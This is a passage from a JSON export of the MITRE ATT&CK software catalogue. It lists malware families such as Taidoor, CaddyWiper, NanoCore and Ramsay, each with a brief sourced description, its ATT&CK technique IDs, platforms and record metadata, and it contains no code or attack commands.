        "T1560.002",
        "T1036.004",
        "T1005",
        "T1560.003",
        "T1129",
        "T1553.001",
        "T1059.001",
        "T1036.008"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0352",
      "stix_id": "malware--b00f90b6-c75c-4bfd-b813-ca9e6c9ebf29",
      "created": "2019-01-30T19:18:19.667000+00:00",
      "modified": "2024-04-11T00:28:52.310000+00:00"
    },
    "S1172": {
      "id": "S1172",
      "name": "OilBooster",
      "description": "[OilBooster](https://attack.mitre.org/software/S1172) is a downloader written in Microsoft Visual C/C++ that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against target organizations in Israel to download and execute files and for exfiltration.(Citation: ESET OilRig Downloaders DEC 2023)   ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1082",
        "T1567.002",
        "T1564.003",
        "T1059.003",
        "T1102.002",
        "T1559",
        "T1105",
        "T1071.001",
        "T1033",
        "T1074.001",
        "T1008",
        "T1573.002",
        "T1140",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1172",
      "stix_id": "malware--b0381480-d5ba-4dd8-a39e-fb8f1afea3a0",
      "created": "2024-11-26T21:02:40.104000+00:00",
      "modified": "2024-11-27T19:43:37.942000+00:00"
    },
    "S0222": {
      "id": "S0222",
      "name": "CCBkdr",
      "description": "[CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1195.002",
        "T1568.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0222",
      "stix_id": "malware--b0f13390-cec7-4814-b37c-ccec01887faa",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:44:25.199000+00:00"
    },
    "S0052": {
      "id": "S0052",
      "name": "OnionDuke",
      "description": "[OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003",
        "T1499",
        "T1102.003",
        "T1071.001",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0052",
      "stix_id": "malware--b136d088-a829-432c-ac26-5529c26d4c7e",
      "created": "2017-05-31T21:32:37.341000+00:00",
      "modified": "2025-04-25T14:44:25.559000+00:00"
    },
    "S0011": {
      "id": "S0011",
      "name": "Taidoor",
      "description": "[Taidoor](https://attack.mitre.org/software/S0011) is a remote access trojan (RAT) that has been used by Chinese government cyber actors to maintain access on victim networks.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Taidoor](https://attack.mitre.org/software/S0011) has primarily been used against Taiwanese government organizations since at least 2010.(Citation: TrendMicro Taidoor)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1124",
        "T1059.003",
        "T1112",
        "T1071.001",
        "T1573.001",
        "T1106",
        "T1070.004",
        "T1566.001",
        "T1016",
        "T1140",
        "T1012",
        "T1055.001",
        "T1105",
        "T1005",
        "T1083",
        "T1057",
        "T1027.013",
        "T1204.002",
        "T1547.001",
        "T1095"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0011",
      "stix_id": "malware--b143dfa4-e944-43ff-8429-bfffc308c517",
      "created": "2017-05-31T21:32:14.900000+00:00",
      "modified": "2024-04-10T22:36:03.362000+00:00"
    },
    "S0028": {
      "id": "S0028",
      "name": "SHIPSHAPE",
      "description": "[SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1091",
        "T1547.009"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0028",
      "stix_id": "malware--b1de6916-7a22-4460-8d26-6b5483ffaa2a",
      "created": "2017-05-31T21:32:21.366000+00:00",
      "modified": "2024-11-17T15:05:25.108000+00:00"
    },
    "S0107": {
      "id": "S0107",
      "name": "Cherry Picker",
      "description": "[Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1546.010",
        "T1048.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0107",
      "stix_id": "malware--b2203c59-4089-4ee4-bfe1-28fa25f0dbfe",
      "created": "2017-05-31T21:33:05.710000+00:00",
      "modified": "2025-04-25T14:44:26.291000+00:00"
    },
    "S0578": {
      "id": "S0578",
      "name": "SUPERNOVA",
      "description": "[SUPERNOVA](https://attack.mitre.org/software/S0578) is an in-memory web shell written in .NET C#. It was discovered in November 2020 during the investigation of [APT29](https://attack.mitre.org/groups/G0016)'s SolarWinds cyber operation but determined to be unrelated. Subsequent analysis suggests [SUPERNOVA](https://attack.mitre.org/software/S0578) may have been used by the China-based threat group SPIRAL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: SolarWinds Advisory Dec 2020)(Citation: CISA Supernova Jan 2021)(Citation: Microsoft Analyzing Solorigate Dec 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1203",
        "T1036.005",
        "T1505.003",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0578",
      "stix_id": "malware--b2b0b946-be0a-4a7f-9c32-a2e5211d1cd9",
      "created": "2021-02-18T17:35:13.361000+00:00",
      "modified": "2024-04-10T23:45:34.261000+00:00"
    },
    "S0016": {
      "id": "S0016",
      "name": "P2P ZeuS",
      "description": "[P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. (Citation: Dell P2P ZeuS)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1001.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0016",
      "stix_id": "malware--b2c5d3ca-b43a-4888-ad8d-e2d43497bf85",
      "created": "2017-05-31T21:32:16.715000+00:00",
      "modified": "2024-04-24T19:08:50.637000+00:00"
    },
    "S0437": {
      "id": "S0437",
      "name": "Kivars",
      "description": "[Kivars](https://attack.mitre.org/software/S0437) is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by [BlackTech](https://attack.mitre.org/groups/G0098) in a 2010 campaign.(Citation: TrendMicro BlackTech June 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1083",
        "T1056.001",
        "T1564.003",
        "T1113",
        "T1105",
        "T1021"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0437",
      "stix_id": "malware--b2d134a1-7bd5-4293-94d4-8fc978cb1cd7",
      "created": "2020-05-06T18:10:59.143000+00:00",
      "modified": "2025-04-25T14:44:27.009000+00:00"
    },
    "S0693": {
      "id": "S0693",
      "name": "CaddyWiper",
      "description": "[CaddyWiper](https://attack.mitre.org/software/S0693) is a destructive data wiper that has been used in attacks against organizations in Ukraine since at least March 2022.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1222.001",
        "T1083",
        "T1485",
        "T1106",
        "T1057",
        "T1561.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0693",
      "stix_id": "malware--b30d999d-64e0-4e35-9856-884e4b83d611",
      "created": "2022-03-23T20:15:38.177000+00:00",
      "modified": "2024-04-17T15:09:37.646000+00:00"
    },
    "S0687": {
      "id": "S0687",
      "name": "Cyclops Blink",
      "description": "[Cyclops Blink](https://attack.mitre.org/software/S0687) is a modular malware that has been used in widespread campaigns by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least 2019 to target Small/Home Office (SOHO) network devices, including WatchGuard and Asus. [Cyclops Blink](https://attack.mitre.org/software/S0687) is assessed to be a replacement for [VPNFilter](https://attack.mitre.org/software/S1010), a similar platform targeting network devices.(Citation: NCSC Cyclops Blink February 2022)(Citation: NCSC CISA Cyclops Blink Advisory February 2022)(Citation: Trend Micro Cyclops Blink March 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1573.002",
        "T1070.006",
        "T1036.005",
        "T1082",
        "T1542.002",
        "T1005",
        "T1083",
        "T1562.004",
        "T1041",
        "T1057",
        "T1016",
        "T1132.002",
        "T1090.003",
        "T1559",
        "T1105",
        "T1071.001",
        "T1037.004",
        "T1140",
        "T1572",
        "T1571"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S0687",
      "stix_id": "malware--b350b47f-88fe-4921-8538-6d9c59bac84e",
      "created": "2022-03-03T15:37:41.440000+00:00",
      "modified": "2025-04-15T19:46:35.048000+00:00"
    },
    "S0012": {
      "id": "S0012",
      "name": "PoisonIvy",
      "description": "[PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) that has been used by many groups.(Citation: FireEye Poison Ivy)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Darkmoon Aug 2005)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1112",
        "T1547.001",
        "T1027",
        "T1056.001",
        "T1547.014",
        "T1480.002",
        "T1055.001",
        "T1074.001",
        "T1059.003",
        "T1105",
        "T1573.001",
        "T1005",
        "T1010",
        "T1014"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0012",
      "stix_id": "malware--b42378e0-f147-496f-992a-26a49705395b",
      "created": "2017-05-31T21:32:15.263000+00:00",
      "modified": "2024-11-17T19:55:07.591000+00:00"
    },
    "S0345": {
      "id": "S0345",
      "name": "Seasalt",
      "description": "[Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1083",
        "T1071.001",
        "T1057",
        "T1036.004",
        "T1105",
        "T1027.013",
        "T1543.003",
        "T1070.004",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0345",
      "stix_id": "malware--b45747dc-87ca-4597-a245-7e16a61bc491",
      "created": "2019-01-30T15:27:06.404000+00:00",
      "modified": "2024-04-11T00:08:51.818000+00:00"
    },
    "S0637": {
      "id": "S0637",
      "name": "NativeZone",
      "description": "[NativeZone](https://attack.mitre.org/software/S0637) is the name given collectively to disposable custom [Cobalt Strike](https://attack.mitre.org/software/S0154) loaders used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)(Citation: SentinelOne NobleBaron June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1204.002",
        "T1497.001",
        "T1218.011",
        "T1140",
        "T1480",
        "T1036"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0637",
      "stix_id": "malware--b4783be3-35d9-4a56-ac8d-1f3e1c9d9a84",
      "created": "2021-08-04T19:36:55.518000+00:00",
      "modified": "2025-04-25T14:44:28.081000+00:00"
    },
    "S0336": {
      "id": "S0336",
      "name": "NanoCore",
      "description": "[NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1059.003",
        "T1016",
        "T1125",
        "T1562.004",
        "T1027",
        "T1123",
        "T1059.005",
        "T1056.001",
        "T1112",
        "T1573.001",
        "T1562.001",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0336",
      "stix_id": "malware--b4d80f8b-d2b9-4448-8844-4bef777ed676",
      "created": "2019-01-29T20:05:35.952000+00:00",
      "modified": "2024-09-25T15:05:04.341000+00:00"
    },
    "S0467": {
      "id": "S0467",
      "name": "TajMahal",
      "description": "[TajMahal](https://attack.mitre.org/software/S0467) is a multifunctional spying framework that has been in use since at least 2014. [TajMahal](https://attack.mitre.org/software/S0467) is comprised of two separate packages, named Tokyo and Yokohama, and can deploy up to 80 plugins.(Citation: Kaspersky TajMahal April 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1560.002",
        "T1125",
        "T1082",
        "T1113",
        "T1123",
        "T1518.001",
        "T1119",
        "T1124",
        "T1041",
        "T1057",
        "T1518",
        "T1112",
        "T1016",
        "T1020",
        "T1129",
        "T1539",
        "T1083",
        "T1055.001",
        "T1025",
        "T1005",
        "T1056.001",
        "T1120",
        "T1115",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0467",
      "stix_id": "malware--b51797f7-57da-4210-b8ac-b8632ee75d70",
      "created": "2020-06-08T14:57:32.842000+00:00",
      "modified": "2025-04-25T14:44:28.616000+00:00"
    },
    "S0435": {
      "id": "S0435",
      "name": "PLEAD",
      "description": "[PLEAD](https://attack.mitre.org/software/S0435) is a remote access tool (RAT) and downloader used by [BlackTech](https://attack.mitre.org/groups/G0098) in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [PLEAD](https://attack.mitre.org/software/S0435) has also been referred to as [TSCookie](https://attack.mitre.org/software/S0436), though more recent reporting indicates likely separation between the two. [PLEAD](https://attack.mitre.org/software/S0435) was observed in use as early as March 2017.(Citation: JPCert TSCookie March 2018)(Citation: JPCert PLEAD Downloader June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1059.003",
        "T1555",
        "T1090",
        "T1204.002",
        "T1083",
        "T1001.001",
        "T1105",
        "T1070.004",
        "T1204.001",
        "T1106",
        "T1057",
        "T1010",
        "T1573.001",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0435",
      "stix_id": "malware--b57f419e-8b12-49d3-886b-145383725dcd",
      "created": "2020-05-06T12:55:10.969000+00:00",
      "modified": "2025-04-25T19:04:32.446000+00:00"
    },
    "S1148": {
      "id": "S1148",
      "name": "Raccoon Stealer",
      "description": "[Raccoon Stealer](https://attack.mitre.org/software/S1148) is an information stealer malware family active since at least 2019 as a malware-as-a-service offering sold in underground forums. [Raccoon Stealer](https://attack.mitre.org/software/S1148) has experienced two periods of activity across two variants, from 2019 to March 2022, then resurfacing in a revised version in June 2022.(Citation: S2W Racoon 2022)(Citation: Sekoia Raccoon1 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1071.001",
        "T1005",
        "T1124",
        "T1027.013",
        "T1105",
        "T1020",
        "T1213",
        "T1555.003",
        "T1560",
        "T1027.007",
        "T1195",
        "T1614",
        "T1119",
        "T1113",
        "T1041",
        "T1070.004",
        "T1012",
        "T1518",
        "T1087.001",
        "T1539",
        "T1140",
        "T1082",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1148",
      "stix_id": "malware--b5a8fb8b-4ff1-43e5-a1ad-75ae565f5175",
      "created": "2024-08-01T21:53:48.812000+00:00",
      "modified": "2024-10-11T14:44:53.661000+00:00"
    },
    "S1132": {
      "id": "S1132",
      "name": "IPsec Helper",
      "description": "[IPsec Helper](https://attack.mitre.org/software/S1132) is a post-exploitation remote access tool linked to [Agrius](https://attack.mitre.org/groups/G1030) operations. This malware shares significant programming and functional overlaps with [Apostle](https://attack.mitre.org/software/S1133) ransomware, also linked to [Agrius](https://attack.mitre.org/groups/G1030). [IPsec Helper](https://attack.mitre.org/software/S1132) provides basic remote access tool functionality such as uploading files from victim systems, running commands, and deploying additional payloads.(Citation: SentinelOne Agrius 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070",
        "T1570",
        "T1057",
        "T1070.009",
        "T1112",
        "T1027.013",
        "T1059.001",
        "T1059.005",
        "T1005",
        "T1059.003",
        "T1497.003",
        "T1071.001",
        "T1041",
        "T1569.002",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1132",
      "stix_id": "malware--b5dc19b7-588d-403b-848d-c868bd61ffa1",
      "created": "2024-05-22T19:13:15.858000+00:00",
      "modified": "2024-08-29T15:20:43.368000+00:00"
    },
    "S0187": {
      "id": "S0187",
      "name": "Daserf",
      "description": "[Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1553.002",
        "T1105",
        "T1027.002",
        "T1132.001",
        "T1560.001",
        "T1113",
        "T1027",
        "T1001.002",
        "T1573.001",
        "T1036.005",
        "T1056.001",
        "T1071.001",
        "T1003.001",
        "T1560",
        "T1027.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0187",
      "stix_id": "malware--b6b3dfc7-9a81-43ff-ac04-698bad48973a",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:44:29.509000+00:00"
    },
    "S0597": {
      "id": "S0597",
      "name": "GoldFinder",
      "description": "[GoldFinder](https://attack.mitre.org/software/S0597) is a custom HTTP tracer tool written in Go that logs the route a packet takes between a compromised network and a C2 server. It can be used to inform  threat actors of potential points of discovery or logging of their actions, including C2 related to other malware. [GoldFinder](https://attack.mitre.org/software/S0597) was discovered in early 2021 during an investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) by [APT29](https://attack.mitre.org/groups/G0016).(Citation: MSTIC NOBELIUM Mar 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016.001",
        "T1119",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0597",
      "stix_id": "malware--b7010785-699f-412f-ba49-524da6033c76",
      "created": "2021-03-26T16:48:31.793000+00:00",
      "modified": "2025-04-16T20:38:31.830000+00:00"
    },
    "S0335": {
      "id": "S0335",
      "name": "Carbon",
      "description": "[Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. [Carbon](https://attack.mitre.org/software/S0335) has been selectively used by [Turla](https://attack.mitre.org/groups/G0010) to target government and foreign affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1102",
        "T1049",
        "T1012",
        "T1069",
        "T1124",
        "T1016",
        "T1074.001",
        "T1543.003",
        "T1573.002",
        "T1140",
        "T1048.003",
        "T1018",
        "T1071.001",
        "T1027",
        "T1095",
        "T1055.001",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0335",
      "stix_id": "malware--b7e9880a-7a7c-4162-bddb-e28e8ef2bf1f",
      "created": "2019-01-29T19:36:02.103000+00:00",
      "modified": "2025-04-25T14:44:30.048000+00:00"
    },
    "S0397": {
      "id": "S0397",
      "name": "LoJax",
      "description": "[LoJax](https://attack.mitre.org/software/S0397) is a UEFI rootkit used by [APT28](https://attack.mitre.org/groups/G0007) to persist remote access software on targeted systems.(Citation: ESET LoJax Sept 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1564.004",
        "T1547.001",
        "T1542.001",
        "T1014"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0397",
      "stix_id": "malware--b865dded-0553-4962-a44b-6fe7863effed",
      "created": "2019-07-02T12:58:09.598000+00:00",
      "modified": "2025-04-25T14:44:30.421000+00:00"
    },
    "S0348": {
      "id": "S0348",
      "name": "Cardinal RAT",
      "description": "[Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote access trojan (RAT) observed since December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1105",
        "T1083",
        "T1033",
        "T1056.001",
        "T1573.001",
        "T1204.002",
        "T1560.002",
        "T1012",
        "T1027.004",
        "T1090",
        "T1055",
        "T1070.004",
        "T1140",
        "T1082",
        "T1008",
        "T1071.001",
        "T1112",
        "T1547.001",
        "T1057",
        "T1113",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0348",
      "stix_id": "malware--b879758f-bbc4-4cab-b5ba-177ac9b009b4",
      "created": "2019-01-30T16:39:53.573000+00:00",
      "modified": "2024-04-11T02:47:11.431000+00:00"
    },
    "S1014": {
      "id": "S1014",
      "name": "DanBot",
      "description": "[DanBot](https://attack.mitre.org/software/S1014) is a first-stage remote access Trojan written in C# that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least 2018.(Citation: SecureWorks August 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1036.005",
        "T1021.005",
        "T1027.013",
        "T1070.004",
        "T1204.002",
        "T1071.004",
        "T1005",
        "T1105",
        "T1566.001",
        "T1071.001",
        "T1059.005",
        "T1059.003",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1014",
      "stix_id": "malware--b8d48deb-450c-44f6-a934-ac8765aa89cb",
      "created": "2022-06-03T14:35:23.246000+00:00",
      "modified": "2024-04-11T02:42:34.540000+00:00"
    },
    "S0017": {
      "id": "S0017",
      "name": "BISCUIT",
      "description": "[BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by [APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1008",
        "T1082",
        "T1124",
        "T1057",
        "T1105",
        "T1056.001",
        "T1573.002",
        "T1033",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0017",
      "stix_id": "malware--b8eb28e4-48a6-40ae-951a-328714f75eda",
      "created": "2017-05-31T21:32:17.147000+00:00",
      "modified": "2023-12-26T19:55:54.853000+00:00"
    },
    "S0274": {
      "id": "S0274",
      "name": "Calisto",
      "description": "[Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.001",
        "T1217",
        "T1016",
        "T1105",
        "T1056.002",
        "T1005",
        "T1070.004",
        "T1569.001",
        "T1560.001",
        "T1036.005",
        "T1555.001",
        "T1564.001",
        "T1074.001",
        "T1098",
        "T1136.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0274",
      "stix_id": "malware--b8fdef82-d2cf-4948-8949-6466357b1be1",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:38:32.306000+00:00"
    },
    "S1166": {
      "id": "S1166",
      "name": "Solar",
      "description": "[Solar](https://attack.mitre.org/software/S1166) is a C#/.NET backdoor that was used by [OilRig](https://attack.mitre.org/groups/G0049) during the [Outer Space](https://attack.mitre.org/campaigns/C0042) campaign to download, execute, and exfiltrate files.(Citation: ESET OilRig Campaigns Sep 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1105",
        "T1020",
        "T1573.001",
        "T1041",
        "T1082",
        "T1070.004",
        "T1132.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1166",
      "stix_id": "malware--b921a2fa-09fe-46b8-bd3c-8118781bf1f8",
      "created": "2024-11-21T21:40:02.793000+00:00",
      "modified": "2024-11-27T19:39:59.647000+00:00"
    },
    "S0124": {
      "id": "S0124",
      "name": "Pisloader",
      "description": "[Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used by the group. (Citation: Palo Alto DNS Requests)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1059.003",
        "T1132.001",
        "T1016",
        "T1071.004",
        "T1027",
        "T1105",
        "T1082",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0124",
      "stix_id": "malware--b96680d1-5eb3-4f07-b95c-00ab904ac236",
      "created": "2017-05-31T21:33:12.388000+00:00",
      "modified": "2025-04-25T14:44:31.662000+00:00"
    },
    "S0493": {
      "id": "S0493",
      "name": "GoldenSpy",
      "description": "[GoldenSpy](https://attack.mitre.org/software/S0493) is a backdoor malware which has been packaged with legitimate tax preparation software. [GoldenSpy](https://attack.mitre.org/software/S0493) was discovered targeting organizations in China, being delivered with the \"Intelligent Tax\" software suite which is produced by the Golden Tax Department of Aisino Credit Information Co. and required to pay local taxes.(Citation: Trustwave GoldenSpy June 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1082",
        "T1136.001",
        "T1571",
        "T1041",
        "T1195.002",
        "T1036.005",
        "T1106",
        "T1059.003",
        "T1083",
        "T1070.004",
        "T1071.001",
        "T1105",
        "T1497.003",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0493",
      "stix_id": "malware--b9704a7d-feef-4af9-8898-5280f1686326",
      "created": "2020-07-23T13:50:10.409000+00:00",
      "modified": "2024-04-11T02:27:23.911000+00:00"
    },
    "S0249": {
      "id": "S0249",
      "name": "Gold Dragon",
      "description": "[Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave Prince](https://attack.mitre.org/software/S0252) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1033",
        "T1105",
        "T1074.001",
        "T1547.001",
        "T1560",
        "T1057",
        "T1562.001",
        "T1083",
        "T1059.003",
        "T1082",
        "T1071.001",
        "T1518.001",
        "T1012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0249",
      "stix_id": "malware--b9799466-9dd7-4098-b2d6-f999ce50b9a8",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-05-06T20:40:17+00:00"
    },
    "S0258": {
      "id": "S0258",
      "name": "RGDoor",
      "description": "[RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. [RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers belonging to the Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1505.004",
        "T1059.003",
        "T1560.003",
        "T1071.001",
        "T1033",
        "T1140",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0258",
      "stix_id": "malware--b9eec47e-98f4-4b3c-b574-3fa8a87ebe05",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:32.382000+00:00"
    },
    "S0458": {
      "id": "S0458",
      "name": "Ramsay",
      "description": "[Ramsay](https://attack.mitre.org/software/S0458) is an information stealing malware framework designed to collect and exfiltrate sensitive documents, including from air-gapped systems. Researchers have identified overlaps between [Ramsay](https://attack.mitre.org/software/S0458) and the [Darkhotel](https://attack.mitre.org/groups/G0012)-associated Retro malware.(Citation: Eset Ramsay May 2020)(Citation: Antiy CERT Ramsay April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1135",
        "T1559.002",
        "T1113",
        "T1016",
        "T1106",
        "T1014",
        "T1046",
        "T1071.001",
        "T1080",
        "T1566.001",
        "T1005",
        "T1053.005",
        "T1074.001",
        "T1120",
        "T1574.001",
        "T1039",
        "T1560.003",
        "T1560.001",
        "T1203",
        "T1082",
        "T1027.003",
        "T1036.005",
        "T1057",
        "T1547.001",
        "T1548.002",
        "T1036",
        "T1119",
        "T1091",
        "T1083",
        "T1055.001",
        "T1204.002",
        "T1059.005",
        "T1027",
        "T1049",
        "T1140",
        "T1132.001",
